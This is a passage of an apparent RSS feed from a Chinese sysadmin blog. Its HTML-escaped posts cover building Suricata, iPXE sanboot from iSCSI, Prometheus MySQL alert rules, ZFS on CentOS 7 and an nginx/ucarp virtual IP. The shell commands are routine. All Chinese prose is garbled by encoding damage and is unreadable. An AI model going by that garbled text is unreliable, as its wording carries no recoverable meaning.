&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4ã€é¦–å…ˆå®‰è£…java&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -ivh jdk-8u201-linux-x64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…ï¼š
ä¸€ã€ç¼–è¯‘å®‰è£…suricata&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf suricata-4.1.8.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; suricata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure --libdir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/lib64 --prefix&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr --sysconfdir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc --localstatedir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make install-full
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;éªŒè¯ä¸€ä¸‹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;suricata -V
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This is Suricata version 4.1.8 RELEASE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŸ¥çœ‹buildå‚æ•°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;suricata --build-info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;suricataå°±è£…å¥½äº†ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹suricata-updateï¼Œè§„åˆ™æ‰æ˜¯æœ€ä¸»è¦çš„ï¼Œè£…å¥½åæœ€å¥½æ¯å¤©æ›´æ–°ä¸€ä¸‹è§„åˆ™&lt;/p&gt;</description>
    </item>
    <item>
      <title>ipxeä½¿ç”¨sanbootè¿œç¨‹å¯åŠ¨iscsiç¡¬ç›˜</title>
      <link>https://rendoumi.com/posts/20231215-pxe_sanboot/</link>
      <pubDate>Fri, 15 Dec 2023 15:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-pxe_sanboot/</guid>
      <description>&lt;p&gt;å¦‚æœä¸€å°å®¿ä¸»æœºä¸Šé¢cpuå’Œmemoryéƒ½æœ‰å¯Œè£•ï¼Œä½†æ˜¯ç£ç›˜ä¸å¯Œè£•ï¼Œé‚£å°±ä¼šé¢ä¸´èµ„æºæµªè´¹&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å¹²è„†ç”¨ipxeçš„sanbootæ¥å¯åŠ¨è¿œç¨‹çš„iscsiç£ç›˜æ¥å¯åŠ¨è™šæœºå¥½äº†&lt;/p&gt;
&lt;p&gt;é¦–å…ˆç”¨ã€Š&lt;a href=&#34;https://bajie.dev/posts/20230801-iscsi_volume/&#34;&gt;iscsiå·çš„è¿œç¨‹æŒ‚è½½&lt;/a&gt;ã€‹è¿™ç¯‡æ–‡ç« ä¸­æ‰€è¯´çš„æ–¹æ³•ï¼Œåœ¨172.18.30.18çš„20Tçš„loopback vg groupä¸Šï¼Œåˆ’å‡ºä¸€å—80Gçš„ç¡¬ç›˜&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å»ºç«‹blockå—è®¾å¤‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå·ï¼Œè¿˜æ˜¯ç”¨ä¸‹é¢çš„ç²¾å‡†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ ä»»ä½•è®¤è¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®°ä¸‹æ¥è¿™ä¸ª:  iqn.2020-10.com.ddky:vis-18-31-48&lt;/p&gt;
&lt;p&gt;ç„¶åä¿®æ”¹pxeï¼Œä½äº172.18.31.2 /export/html/pxeboot/boot2.phpï¼Œæœ¬è´¨æ˜¯å‘é€ipxeçš„å‘½ä»¤&lt;/p&gt;
&lt;p&gt;sanhookæ˜¯åŠ è½½è¿œç¨‹ç¡¬ç›˜ï¼Œå¹¶è®¾ç½®ä¸º/dev/sda&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; sansetup&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    global &lt;span class=&#34;nv&#34;&gt;$hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:sansetup\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;set keep-san 1\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;kernel &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$hostname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;initrd &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$hostname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;imgargs vmlinuz load_ramdisk=1 ks=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$hostname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;boot\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘åŠ¨ä¸€ä¸ªæ— ç›˜çš„è™šæœºä»pxeå¯åŠ¨ï¼ˆ172.18.30.3 /export/kvm/48.shï¼‰ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Prometheusé›†æˆè¿›mysql_exporter</title>
      <link>https://rendoumi.com/posts/20231215-prometheus_mysql/</link>
      <pubDate>Fri, 15 Dec 2023 14:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-prometheus_mysql/</guid>
      <description>&lt;p&gt;mysql_exporter å…¶å®æ˜¯ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ï¼Œå®šæ—¶æ”¶é›†æœ¬æœºmysqlçš„æ•°æ®ï¼Œå¹¶æš´éœ²å‡ºä¸€ä¸ªwebç«¯å£å±•ç°æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼šhttp://172.18.20.9:50001/metrics ï¼Œè¿™é‡Œæˆ‘ä»¬æš´éœ²çš„ç«¯å£æ˜¯50001ã€‚&lt;/p&gt;
&lt;p&gt;prometheus æ¯éš”5åˆ†é’Ÿä¼šè®¿é—®è¿™ä¸ªwebé¡µé¢ï¼ŒæŠŠä¸Šé¢çš„æ•°æ®æŠ“ä¸‹æ¥å…¥åº“ã€‚ï¼ˆæ—¶é—´é—´éš”å¯ä»¥è°ƒæ•´ï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç‚¹è¿›Prometheusçš„é¡µé¢ï¼š&lt;/p&gt;
&lt;p&gt;æ³¨æ„å³ä¸‹è§’çš„æ—¶é—´æˆ³æ˜¯ä¸å¯¹çš„ï¼Œå·®8å°æ—¶ï¼Œæˆ‘ä»¬ç‚¹å³ä¸Šè§’çš„React UI
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-prometheus_mysql/2021-11-23_084815.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªUIæ—¶é—´æ˜¯å¯¹çš„ï¼Œè·Ÿå½“åœ°æ—¶é—´ä¸€è‡´ï¼š
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-prometheus_mysql/2021-11-23_084907.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æƒ³çœ‹ mysql çš„æŒ‡æ ‡ï¼Œå°±éœ€è¦ç¼–è¾‘å…¬å¼ï¼Œè¾“å…¥mysqlä¼šæ˜¾ç¤ºæ‰€æœ‰mysqlçš„å…¬å¼ï¼š
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-prometheus_mysql/2021-11-23_085033.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šæˆ‘ä»¬ mysql_exporter çš„ç«¯å£æ˜¯50001 ï¼Œ å†™ promsql é€‰æ‹©instanceçš„æ—¶å€™æ˜¯è¿™æ ·çš„instance=&amp;ldquo;172.18.20.9:50001&amp;rdquo;&lt;/p&gt;
&lt;p&gt;ç»™ä¸€äº›æŠ¥è­¦ä¾‹å­ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rate(mysql_global_status_threads_connected[5m]) &amp;gt; 200

mysql_global_variables_max_connections - mysql_global_status_threads_connected &amp;lt; 500

mysql_global_status_innodb_num_open_files &amp;gt; (mysql_global_variables_open_files_limit) * 0.75
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CentOS7å®‰è£…ZFS</title>
      <link>https://rendoumi.com/posts/20231215-zfs_centos/</link>
      <pubDate>Fri, 15 Dec 2023 13:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-zfs_centos/</guid>
      <description>&lt;p&gt;zfsç”¨æ¥é¡¶æ›¿Raidæ§åˆ¶å¡ï¼Œæœ‰ç›¸å½“å¼ºæ‚çš„æ€§èƒ½ï¼ŒTrueNASç”¨çš„å°±æ˜¯è¿™ç©æ„ã€‚&lt;/p&gt;
&lt;p&gt;å®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š
&lt;a href=&#34;https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html&#34;&gt;https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CentOS7å®‰è£…&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yum install -y epel-release
yum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm
yum install -y kernel-devel zfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åŠ è½½æ¨¡å—&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]# lsmod|grep zfs

[root@localhost ~]# modprobe zfs

[root@localhost ~]# lsmod|grep zfs
zfs                  3986850  0 
zunicode              331170  1 zfs
zlua                  151525  1 zfs
zcommon                89551  1 zfs
znvpair                94388  2 zfs,zcommon
zavl                   15167  1 zfs
icp                   301854  1 zfs
spl                   104299  5 icp,zfs,zavl,zcommon,znvpair
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]#  zfs list
no datasets available
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;192.168.85.100çš„æœ¬åœ°ç£ç›˜ä»sdb ä¸€ç›´åˆ° sdgï¼Œé¦–å…ˆzpoolå»ºç«‹æ± å­ï¼Œç±»ä¼¼raidå¡çš„åŠŸèƒ½
ç„¶åå†zfså»ºç«‹æ–‡ä»¶ç³»ç»Ÿ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg

[root@localhost ~]# zpool status
  pool: zfspool
 state: ONLINE
  scan: none requested
config:

        NAME        STATE     READ WRITE CKSUM
        zfspool     ONLINE       0     0     0
          sdb       ONLINE       0     0     0
          sdc       ONLINE       0     0     0
          sdd       ONLINE       0     0     0
          sde       ONLINE       0     0     0
          sdf       ONLINE       0     0     0
          sdg       ONLINE       0     0     0

errors: No known data errors

[root@localhost ~]# df -h
æ–‡ä»¶ç³»ç»Ÿ                 å®¹é‡  å·²ç”¨  å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹
devtmpfs                  63G     0   63G    0% /dev
tmpfs                     63G     0   63G    0% /dev/shm
tmpfs                     63G  9.9M   63G    1% /run
tmpfs                     63G     0   63G    0% /sys/fs/cgroup
/dev/mapper/centos-root   50G  1.7G   49G    4% /
/dev/sda1               1014M  189M  826M   19% /boot
/dev/mapper/centos-home  392G   33M  392G    1% /home
tmpfs                     13G     0   13G    0% /run/user/0
zfspool                   53T  128K   53T    1% /zfspool
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢å¯¹ç”Ÿäº§æ— æ„ä¹‰ï¼Œæ²¡æœ‰ä»»ä½•å†—ä½™çš„é…ç½®åœ¨ç”Ÿäº§æ˜¯è¡Œä¸é€šçš„&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ucarpå’Œnginxæä¾›å†…ç½‘vip</title>
      <link>https://rendoumi.com/posts/20231214-ucarp_nginx/</link>
      <pubDate>Thu, 14 Dec 2023 16:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231214-ucarp_nginx/</guid>
      <description>&lt;p&gt;ucarpæˆ‘ä»¬æ¥å®æˆ˜ä¸€ä¸‹å®Œæˆucarp+nginxåšå†…ç½‘vipï¼Œæ¨¡æ‹ŸF5çš„vipçš„æ–¹æ³•&lt;/p&gt;
&lt;p&gt;ucarpçš„å®‰è£…å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œç¯å¢ƒå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ucarp1ï¼š192.168.19.1&lt;/li&gt;
&lt;li&gt;ucarp2ï¼š192.168.19.2&lt;/li&gt;
&lt;li&gt;vipï¼š172.18.19.10&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨172.18.19.1å’Œ172.18.19.2ä¸Šç¼–è¯‘Nginx 1.16.1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ./configure --prefix&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/servers/nginx1161 --with-stream --with-stream_ssl_module
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	make
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡ç‚¹æ˜¯/export/servers/nginx1161/conf/nginx.conf&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /export/servers/nginx1161/conf/nginx.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  user  nobody&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  worker_processes  auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  events &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    use epoll&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    worker_connections  65535&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  stream &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  log_format proxy &lt;span class=&#34;s1&#34;&gt;&amp;#39;$remote_addr [$time_local] &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               &lt;span class=&#34;s1&#34;&gt;&amp;#39;$protocol $status $bytes_sent $bytes_received &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               &lt;span class=&#34;s1&#34;&gt;&amp;#39;$session_time &amp;#34;$upstream_addr&amp;#34; &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;$upstream_bytes_sent&amp;#34; &amp;#34;$upstream_bytes_received&amp;#34; &amp;#34;$upstream_connect_time&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  access_log logs/tcp-access.log proxy &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  open_log_file_cache off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  upstream stream_backend01 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$remote_addr&lt;/span&gt; consistent&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#server 172.18.31.2:80 weight=5;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server 172.18.31.2:80 &lt;span class=&#34;nv&#34;&gt;max_fails&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;fail_timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;30s&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#server 172.18.31.2:80 max_conns=3;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
